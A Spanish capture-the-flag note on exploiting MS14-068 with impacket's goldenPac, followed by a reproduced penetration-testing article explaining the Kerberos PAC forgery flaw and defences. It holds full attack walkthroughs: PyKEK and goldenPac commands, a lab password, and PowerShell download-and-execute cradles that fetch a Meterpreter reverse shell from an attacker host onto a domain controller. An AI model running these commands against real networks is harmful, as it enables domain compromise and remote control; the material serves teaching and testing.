Esta vulnerabilidad permite modificar un token de inicio de sesión  de un usuario de dominio válido, agregando para ello una declaración falsa de que el usuario es miembro del grupo administradores del dominio, de la red. Sin tener que modificar los usuarios.

** Uso de 'goldenPac' (impacket) para explotar la vulnerabilidad y acceder al sistema **
> Buscamos la utilidad goldenPac.py:
> `locate goldenPac.py`			// /usr/share/doc/python-impacket/examples/goldenPac.py
> La utilidad hace uso de los nombres de dominio, por lo que habría que añadirlos a nuestra configuración de red:
> `nano /etc/hosts`					// 10.10.10.52	mantis.htb.local htb.local
> Uso de goldenPac.py:
> `python goldenPac.py htb.local/james:J@m3s_P@ssWOrd\!@mantis.htb.local`
> Acceso al sistema como usuario con máximos privilegios

=========================================================================

** POC article **
https://labs.f-secure.com/archive/digging-into-ms14-068-exploitation-and-defence/

# Digging into MS14-068, Exploitation and Defence

Ben Campbell, and Jon Cave, 16 December 2014

The security world has been abuzz lately after Microsoft released a critical security patch to fix a flaw in a core service provided by domain controllers. The vulnerability, known by the identifier MS14-068 (CVE-2014-6324), allows any authenticated domain user to escalate their privileges to domain administrator. As a result, an authenticated attacker is able to completely compromise the domain. Most concerning of all [it was revealed](http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx) that this issue was being exploited in the wild!

This post will discuss the technical details of this vulnerability and provide a brief guide for exploiting this issue in a couple of common scenarios that may be encountered during a penetration test.

### Kerberos in a Windows Domain

Kerberos enables users to authenticate to services via a trusted third party. This allows authentication to be centralised so that all the remote services in a network do not require access to user secrets for authentication purposes. The following steps provide a brief overview of the initial stages of the Kerberos protocol in a Windows domain:

#### 1. AS-REQ

The user authenticates with the trusted third party known as the Key Distribution Centre (KDC) — the domain controller in a Windows domain — by sending a message containing their identity and a timestamp encrypted with their password as proof of identity.

#### 2. AS-REP

If the user authenticated successfully then the KDC constructs a ticket granting ticket (TGT) that will be used by the client to request tickets for other services. The TGT is a service ticket for the Ticket Granting Service (TGS) which is also running on the KDC.

![tgt](https://labs.f-secure.com/assets/Uploads/tgt.png)

_Simplified example of a TGT_

A Kerberos ticket, such as a TGT, contains identifying information about a user and their roles. In a Windows domain this structure is known as the Privilege Attribute Certificate (PAC) which stores information that includes the account name, ID and group membership information. In order to protect the integrity of the PAC it is signed by the KDC using secret keys known only to the KDC and the target service. One signature uses the target service account’s key and the other uses a key known only by the KDC. This allows the KDC or the target service to verify that the PAC has not been tampered with after creation. Furthermore, the entire ticket is encrypted using the target service’s secret key.

In the case of the TGT the account of the target service is the krbtgt account. Therefore, both signatures on the PAC are keyed with the krbtgt account’s key and the ticket is encrypted with that same key.

The ticket also contains a session key for use in future communication with the TGS. The TGT is returned by the KDC in a message that also contains the TGS session key encrypted with the secret key of the user.

#### 3. TGS-REQ

The request for a service ticket from the TGS contains three major components:

-   The name of the service that will be accessed
-   The TGT which is encrypted with the krbtgt key
-   An authenticator: the user ID and a timestamp encrypted with the TGS session key

#### 4. TGS-REP

The TGS can decrypt the presented TGT in order to recover the session key. This key is then used to decrypt the authenticator. The TGS is now able to verify that the ID contained in the authenticator matches the TGT, that the TGT has not expired, and the PAC has a valid signature. If the the information presented is acceptable then the information from the PAC in the TGT is copied into a new service ticket.

The PAC in the new ticket is signed once using the key of the target service and then again with the krbtgt key. The ticket itself is encrypted using the key of the target service.

The client can use the ticket returned by the TGS as a proof of identity with which to access the target service.

### MS14-068 Analysis

On 18th November a critical security patch was released by Microsoft to fix an issue in the way the KDC validates the signature of the PAC. This vulnerability would allow a PAC to be forged that would be accepted by the KDC as legitimate. Since the PAC contains the groups that the user is a member of it would be possible to abuse the flaw to create a fake PAC claiming they are a member of the domain administrators group.

The underlying issue was relatively simple. Instead of requiring one of the three signature types [prescribed by the MS-PAC specification](http://msdn.microsoft.com/en-us/library/cc237955.aspx), the KDC service would accept any checksum type that is implemented in the low-level cryptographic library. The supported checksums included unkeyed algorithms such as plain MD5 or even CRC32. Therefore, it is possible to forge a PAC without knowledge of any secret keys by ‘signing’ it using CRC32.

This issue was easy to verify by making a small modification to Mimikatz so that the PAC in a golden ticket is ‘signed’ using CRC32:

diff --git a/mimikatz/modules/kerberos/kuhl_m_kerberos.c b/mimikatz/modules/kerberos/kuhl_m_kerberos.c
index a262149..2478213 100644
--- a/mimikatz/modules/kerberos/kuhl_m_kerberos.c
+++ b/mimikatz/modules/kerberos/kuhl_m_kerberos.c
@@ -555,7 +555,9 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR
        default:
                SignatureType = KERB_CHECKSUM_HMAC_MD5;
        }

+       SignatureType = KERB_CHECKSUM_CRC32;
+
        if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, &pacType, &pacTypeSize))
        {
                kprintf(L" * PAC generated\n");

The following screenshot shows the ‘signatures’ on the PAC in the TGT generated by the patched version of Mimikatz:

![crc32](https://labs.f-secure.com/assets/Uploads/crc32.png)

_CRC32 PAC Signature_

Although this test of MS14-068 is successful, Mimikatz still requires the krbtgt key in order to encrypt the TGT. We managed to create a forged PAC, but it doesn’t seem possible to put it into a TGT without knowledge of the target service’s secret key (i.e. the krbtgt account’s hash). If this key is available then the standard golden or silver ticket attacks apply, so MS14-068 is unnecessary.

The observation made by Sylvain Monné, and neatly exploited in [his proof of concept (PyKEK)](http://github.com/bidord/pykek), is that the PAC does not necessarily need to be included in the encrypted ticket. Instead, a forged PAC can be placed in the enc-authorization-data segment of the TGS-REQ message. Although this field is encrypted, it is protected with a key known to the user. Either the TGT session key or a sub-session key (specified in the authenticator) can be used. The second trick is to request a valid TGT that does not contain a PAC by setting the PA-PAC-REQUEST parameter in the AS-REQ to false. This is done to ensure there are no conflicts between the legitimate PAC in the TGT and the forged PAC included elsewhere.

So, in order to perform the exploit, only the ID and password of a standard domain user are required. These details are necessary to request a PAC-less TGT, recover the session key that is returned, and encrypt the authenticator in the TGS-REQ.

The following image shows a simplified example of a TGS-REQ message to exploit MS14-068. A valid TGT is included, but it does not contain a PAC. Instead, a malicious PAC created by the user has been included in the enc-authorization-data field. This PAC claims that the user is a member of a number of privileged groups, including the domain administrators, and has been ‘signed’ using plain MD5.

![exploit tgs req](https://labs.f-secure.com/assets/Uploads/_resampled/ResizedImageWzYwMCw3MjVd/exploit-tgs-req.png)

_TGS-REQ containing a forged PAC to exploit MS14-068_

The steps taken by PyKEK to exploit MS14-068 are as follows:

1.  Request a TGT without a PAC by sending an AS-REQ with PA-PAC-REQUEST set to false.
2.  Forge a PAC claiming membership of domain administrators. ‘Sign’ it using plain MD5.
3.  Create a TGS-REQ message with krbtgt as the target. The TGT from the first step is used along with the fake PAC encrypted with a sub-session key.
4.  Send this to a vulnerable domain controller.

The KDC service will accept the forged PAC and return a new TGT which contains a PAC. This TGT can be injected into memory using Mimikatz to be used during the standard Kerberos authentication flow.

Interestingly this entire issue is a repeat of [CVE-2011-0043 (MS11-013)](https://technet.microsoft.com/en-us/library/security/ms11-013.aspx), albeit in a different area of code. At that time the issue was identified as a “Kerberos Unkeyed Checksum Vulnerability” and due to “the Microsoft Kerberos implementation [supporting] a weak hashing mechanism, which can allow for certain aspects of a Kerberos service ticket to be forged”. Furthermore, this issue was reported by the MIT Kerberos team after the same vulnerability was [fixed in their implementation in 2010](http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2010-007.txt) (CVE-2010-1324). Given that the issue was found to be being actively exploited prior to the patch being released it is possible that MS14-068 has been used by advanced attackers for a few years now.

# Practical Exploitation

As well as the above mentioned [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/bidord/pykek), there is a second toolkit which contains a function exploit: [Golden PAC module in Impacket](https://code.google.com/p/impacket/).

At the time of writing, these attacks work against domain controllers running Windows 2008 (R2), and earlier, but not against Windows 2012. The only other requirement is a valid domain account username and password.

### Detecting Vulnerable Domain Controllers

The only sure method for detecting a vulnerable system is to look at its patch level (or by attempting to exploit it). However, the Responder tool from SpiderLabs includes a script that will perform basic vulnerability detection by checking the uptime of the server to see if it has been rebooted since the patch was released.

$ python FindSMB2UpTime.py 172.16.80.10
DC is up since: 2014-11-08 10:22:08
This DC is vulnerable to MS14-068

This check can yield false negatives as a domain controller may have been rebooted without the patch having been applied. For example, the following check shows an un-patched system that has been restarted:

$ python FindSMB2UPTime.py 172.16.80.10
DC is up since: 2014-12-08 20:53:19

### Internal Penetration Testing

The first demonstration is against the target when you have normal network level access. This means you have your DNS server set to the domain’s DNS server (probably your target DC).

It is important when working with Kerberos that your system clock is synced with the target host. Kerberos generally allows a 5 minute skew by default, but we can use tools to find the target’s time from an unauthenticated perspective. For example, the net command:

$ net time -S 172.16.80.10
Wed Dec 10 11:05:09 2014

Or with the nmap smb-os-discovery script:

| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6002 Service Pack 2 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp2
|   Computer name: msfdc01
|   NetBIOS computer name: MSFDC01
|   Domain name: metasploitable.local
|   Forest name: metasploitable.local
|   FQDN: msfdc01.metasploitable.local
|_  System time: 2014-12-10T11:02:33+00:00

After setting your local system time, we need to get the user’s SID. We can query this remotely with the net tool:

$ net rpc -W METASPLOITABLE.LOCAL -U user01 -S 172.16.80.10 shell
Enter user01's password:
Talking to domain METASPLOITABLE (S-1-5-21-2928836948-3642677517-2073454066)
net rpc> user
net rpc user> show 
net rpc user> show user01
user rid: 1105, group rid: 513

We can combine the Domain SID with the user RID to get the target user’s SID: S-1-5-21-2928836948-3642677517-2073454066-1105.

The next step is to generate our Kerberos ticket with PyKEK. We need to supply the following arguments:

-   -u USERNAME@FQDN.DOMAIN.NAME (our username)
-   -d TARGET.FDQN.DOMAIN.NAME (the domain controller)
-   -p PASSWORD (our password)
-   -s SID (our SID)

The following command has generated a forged TGT for user01 and stored it in the TGT_user01@metasploitable.local.ccache file:

$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066
-1105
  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!
  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!
  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!
  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!
  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!
  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!
  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!
  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!
  [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!

To use this ticket, which is in the Credential Cache (ccache) format, we need to move it to the /tmp directory where the Kerberos tools look for tickets:

$ mv TGT_user01@metasploitable.local.ccache /tmp/krb5cc_0

We can then authenticate to the domain controller:

$ smbclient -W METASPLOITABLE.LOCAL -k //msfdc01/c$
OS=[Windows Server (R) 2008 Standard 6002 Service Pack 2] Server=[Windows Server (R) 2008 Standard 6.0]
smb: \>

and even use winexe to execute commands:

$ winexe -k METASPLOITABLE.LOCAL //msfdc01 whoami
metasploitable.local\user01

In order to get a reverse shell, we can set up a Metasploit delivery mechanism such as Powershell Web Delivery:

20141210-11:29 - 192.168.153.133 exploit(web_delivery) > set TARGET 2
TARGET => 2
20141210-11:30 - 192.168.153.133 exploit(web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
20141210-11:30 - 192.168.153.133 exploit(web_delivery) > set LHOST 172.16.3.76
LHOST => 172.16.3.76
20141210-11:30 - 192.168.153.133 exploit(web_delivery) > set LPORT 8686
LPORT => 8686
20141210-11:30 - 192.168.153.133 exploit(web_delivery) > run
[*] Exploit running as background job.

[*] [2014.12.10-11:30:43] Started reverse handler on 172.16.3.76:8686 
[*] [2014.12.10-11:30:43] Using URL: http://0.0.0.0:8080/moKqrqIYh0
[*] [2014.12.10-11:30:43]  Local IP: http://192.168.153.133:8080/moKqrqIYh0
[*] [2014.12.10-11:30:43] Server started.
[*] [2014.12.10-11:30:43] Run the following command on the target machine:
powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.3.76:8080/moKqrqIYh0'))

We then pass the powershell command line to winexe to run as a service:

$ winexe -k METASPLOITABLE.LOCAL //msfdc01 "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.3.76
 :8080/moKqrqIYh0'))"

The result is a reverse shell with administrative privileges on the domain controller. At this point we can create a permanent back-door on the domain to maintain access even if the vulnerability becomes patched in the future.

[*] [2014.12.10-11:36:43] 172.16.80.10     web_delivery - Delivering Payload
[*] [2014.12.10-11:36:43] Sending stage (770048 bytes) to 172.16.80.10
[*] Starting interaction with 1...

meterpreter > getuid
Server username: METASPLOITABLE.LOCAL\user01
meterpreter > sysinfo
Computer        : MSFDC01
OS              : Windows 2008 (Build 6002, Service Pack 2).
Architecture    : x86
System Language : en_GB
Meterpreter     : x86/win32
meterpreter > getsystem
...got system (via technique 1).

#### Alternatively with Impacket

The Golden PAC module included in Impacket makes post exploitation easier by performing it automatically for you. Once a TGT containing a forged PAC has been created it is used to create an SMB connection to the domain controller and the PsExec technique is used to gain command execution:

$ python goldenPac.py metasploitable.local/user01@msfdc01
Impacket v0.9.13-dev - Copyright 2002-2014 Core Security Technologies

Password:
[*] Requesting shares on msfdc01.....
[*] Found writable share ADMIN$
[*] Uploading file zYAhIGAf.exe
[*] Opening SVCManager on msfdc01.....
[*] Creating service WzhF on msfdc01.....
[*] Starting service WzhF.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>echo %COMPUTERNAME%
MSFDC01

### Exploiting Remotely

The second scenario is exploiting a target user who we have compromised remotely, such as via a phishing attack. We assume that we have a shell on the user’s machine, and have recovered their password (e.g. by escalating to SYSTEM and using Mimikatz to dump it).

[*] Meterpreter session 3 opened (172.16.3.76:8686 -> 172.16.80.100:49747) at 2014-12-10 11:55:10 +0000
sessions -i 3
[*] Starting interaction with 3...

meterpreter > getuid
Server username: METASPLOITABLE\user01
meterpreter > sysinfo
Computer        : MSFTS01
OS              : Windows 8.1 (Build 9600).
Architecture    : x64 (Current Process is WOW64)
System Language : en_GB
Meterpreter     : x86/win32

We need to be able to talk to the domain controller in order to use the exploit scripts. So, we add a port forward to meterpreter to pivot port 88 (kerberos) over our implant:

meterpreter > portfwd add -l 88 -p 88 -r 172.16.80.10
[*] Local TCP relay created: 0.0.0.0:88 <-> 172.16.80.10:88

The FQDN for the target system should also point to localhost so that traffic is forwarded via meterpreter. This can be done with a simple addition to /etc/hosts:

$ echo 127.0.0.1 msfdc01 >> /etc/hosts
$ echo 127.0.0.1 msfdc01.metasploitable.local >> /etc/hosts

The user’s SID can be discovered via the command line:

meterpreter > shell
Process 2808 created.
Channel 5 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32\WindowsPowerShell\v1.0>whoami /user
whoami /user

USER INFORMATION
----------------

User Name             SID                                           
===================== ==============================================
metasploitable\user01 S-1-5-21-2928836948-3642677517-2073454066-1105

We know have all the information required to use PyKEK to generate our privileged TGT:

$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066
-1105
  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!
  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!
  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!
  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!
  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!
  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!
  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!
  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!
  [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!

Although Mimikatz can load our ccache file using the kerberos::ptc command, at present the Meterpreter Kiwi module only has support for .kirbi files. We can convert our ccache file to kirbi using Mimikatz as follows:

$ wine mimikatz.exe "kerberos::clist TGT_user01@metasploitable.local.ccache /export" exit
p11-kit: couldn't load module: /usr/lib/i386-linux-gnu/pkcs11/gnome-keyring-pkcs11.so: /usr/lib/i386-linux-gnu/pkcs11/gnome-keyring-pkcs11.so:
 cannot open shared object file: No such file or directory
err:winediag:SECUR32_initNTLMSP ntlm_auth was not found or is outdated. Make sure that ntlm_auth >= 3.0.25 is in your path. Usually, you can
 find it in the winbind package of your distribution.
fixme:msvcrt:MSVCRT__setmode fd (1) mode (0x00040000) unknown
fixme:msvcrt:MSVCRT__setmode fd (2) mode (0x00040000) unknown

  .#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Nov 20 2014 01:35:31)
 .## ^ ##.  
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 15 modules * * */

fixme:lsa:LsaConnectUntrusted 0x42ba8c stub
fixme:lsa:LsaLookupAuthenticationPackage (nil) 0x42b67c 0x42ba84 stub
fixme:wlanapi:WlanOpenHandle (1, (nil), 0x30fdf8, 0x42bac8) stub

mimikatz(commandline) # kerberos::clist TGT_user01@metasploitable.local.ccache /export

Principal : (01) : Z ; @ Z

Data 0
       Start/End/MaxRenew: 10/12/2014 12:00:26 ; 10/12/2014 22:00:25 ; 17/12/2014 12:00:25
       Service Name (01) : Z ; Z ; @ Z
       Target Name  (01) : Z ; Z ; @ Z
       Client Name  (01) : Z ; @ Z
       Flags 50a00000    : pre_authent ; renewable ; proxiable ; forwardable ; 
       Session Key       : 0x00000017 - rc4_hmac_nt      
         09f49cffb2e13a13699fd40443a9fb88
       Ticket            : 0x00000000 - null              ; kvno = 2    [...]
       * Saved to file 0-50a00000-user01@krbtgt-METASPLOITABLE.LOCAL.kirbi !
mimikatz(commandline) # exit
Bye!
fixme:lsa:LsaDeregisterLogonProcess (nil) stub

Now we can load the Kiwi Mimikatz extension into meterpreter, install our ticket, and access resources as a Domain Administrator:

meterpreter > load kiwi
Loading extension kiwi...

  .#####.   mimikatz 2.0 alpha (x86/win32) release "Kiwi en C"
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'    Ported to Metasploit by OJ Reeves `TheColonial` * * */

[!] Loaded x86 Kiwi on an x64 architecture.
success.
meterpreter > kerberos_ticket_use /root/git/pykek/0-50a00000-user01@krbtgt-METASPLOITABLE.LOCAL.kirbi
[*] Using Kerberos ticket stored in /root/git/pykek/0-50a00000-user01@krbtgt-METASPLOITABLE.LOCAL.kirbi, 1231 bytes
[+] Kerberos ticket applied successfully

We can then use create a service remotely, like PSEXEC to get a reverse shell:

meterpreter > shell
Process 1132 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32\WindowsPowerShell\v1.0>sc \\msfdc01\ create psh binPath= "cmd.exe /c powershell.exe -nop -w hidden -c IEX 
 ((new-object net.webclient).downloadstring('http://172.16.3.76:8080/moKqrqIYh0'))"
sc \\msfdc01\ create psh binPath= "cmd.exe /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).
  downloadstring('http://172.16.3.76:8080/moKqrqIYh0'))"
[SC] CreateService SUCCESS

C:\Windows\system32\WindowsPowerShell\v1.0>sc \\msfdc01\ start psh
sc \\msfdc01\ start psh
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

C:\Windows\system32\WindowsPowerShell\v1.0>sc \\msfdc01\ delete psh
sc \\msfdc01\ delete psh
[SC] DeleteService SUCCESS

C:\Windows\system32\WindowsPowerShell\v1.0>exit
exit
meterpreter > background
[*] Backgrounding session 5...

[*] [2014.12.10-13:10:28] 172.16.80.10     web_delivery - Delivering Payload
[*] [2014.12.10-13:10:28] Sending stage (770048 bytes) to 172.16.80.10
[*] Meterpreter session 6 opened (172.16.3.76:8686 -> 172.16.80.10:63162) at 2014-12-10 13:10:31 +0000

20141210-13:10 - 192.168.153.135 exploit(current_user_psexec) > sessions -i 6
[*] Starting interaction with 6...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : MSFDC01
OS              : Windows 2008 (Build 6002, Service Pack 2).
Architecture    : x86
System Language : en_GB
Meterpreter     : x86/win32

Pivoting native tools via Meterpreter to exploit this issue can prove difficult. Forwarding TCP port 445 allows you to use smbclient, however tools such as Winexe require ephemeral DCE-RPC ports so unless you are creating a VPN to your target this would be painful to use remotely. Hopefully more support for this soon.

Also, it’s worth keeping your eye on the current_user_psexec module as it may simplify the post exploitation steps in future. We have made a [pull request](https://github.com/rapid7/metasploit-framework/pull/4357) that introduces Kerberos support, by targeting hostnames instead of IP addresses, to this module:

20141210-22:17 - 192.168.153.133 exploit(current_user_psexec) > rerun
[*] Reloading module...

[*] [2014.12.10-22:17:22] Started reverse handler on 172.16.80.225:8888 
[*] [2014.12.10-22:17:22] msfdc01          Creating service kWfrGWFDDd
[*] [2014.12.10-22:17:23] msfdc01          Starting the service
[*] [2014.12.10-22:17:24] msfdc01          Deleting the service
[*] [2014.12.10-22:17:26] Sending stage (770048 bytes) to 172.16.80.10
[*] Meterpreter session 5 opened (172.16.80.225:8888 -> 172.16.80.10:63815) at 2014-12-10 22:17:43 +0000

### Gotchas

There are a few common issues that may prevent the MS14-068 exploits from working correctly. For example, if the DNS server isn’t resolving correctly you can have trouble authenticating with the Kerberos token. Here are a couple of tricks if you have problems exploiting the issue:

-   Check your local system time is in sync with target
-   Try with full domain name in CAPITALS, e.g. MSFDC01.METASPLOITABLE.LOCAL
-   Try without the FQDN (i.e. just the Netbios name), e.g. msfdc01 or MSFDC01
-   Add the addresses to your /etc/hosts file
-   Use Wireshark to check the DNS requests, you may see incorrect requests like MSFDC01.METASPLOITABLE.LOCAL.METASPLOITABLE.LOCAL

# How can I defend against this?

The only solution for preventing this attack is to apply the patch. If this hasn’t been done already then it may be too late. Microsoft have indicated just how serious this issue is in their [blog post](http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx) giving additional information on the issue:

> Remediation
> 
> The only way a domain compromise can be remediated with a high level of certainty is a complete rebuild of the domain. An attacker with administrative privilege on a domain controller can make a nearly unbounded number of changes to the system that can allow the attacker to persist their access long after the update has been installed. Therefore it is critical to install the update immediately.

This guidance just highlights how important it is to apply security patches in a timely manner.

In the same post, Microsoft provided advice on detecting exploitation of MS14-068. They indicated that login events with a mismatch between the SID and the account name had been observed in the wild. However, the public exploits that have been recently released do not have this same indicator when used correctly. Therefore, only those with well developed monitoring infrastructure are likely to identify any access anomalies that indicate compromise and attempts to exfiltrate data.

This vulnerability demonstrates that if an organisation’s security relies heavily on a single control, such as whether the user is in a particular domain group, they are at risk from attackers defeating that control and gaining easy access to sensitive information. Security must come from understanding which assets are important, where they are located, and restricting routes to those assets so that, for example, a single compromised desktop cannot access them. The number of access routes to critical data should be minimized and hardened to prevent initial exploitation and local privilege escalation. They should also be heavily monitored for signs of compromise, such as accounts trying to access resources they shouldn’t or accounts being added to privileged groups, or early indicators of an attacker trying to gain a foothold, such as EMET or software restriction exceptions.

# Conclusion

A key goal of attackers seeking to compromise a company’s assets is to escalate their privileges to make discovery and access to the information they seek easier. Therefore, a vulnerability such as MS14-068 is highly valuable to them as it allows total access to the domain from a simple phishing attack on a single desktop user. The fact that exploitation of this issue was found in the wild also shows that attackers are not just researching 0-days in browsers and file viewing software, but are also actively researching later stages of compromise such as lateral and vertical movement.

MS14-068 is an exciting prospect for penetration testers as it may provide us with an easy privilege escalation route in engagements over the next few years. However, the worrying flip-side to this is that sensitive corporate and national networks are likely to be vulnerable to such an easy attack. Even worse, it will be difficult to be certain of the integrity of networks that _have_ been patched.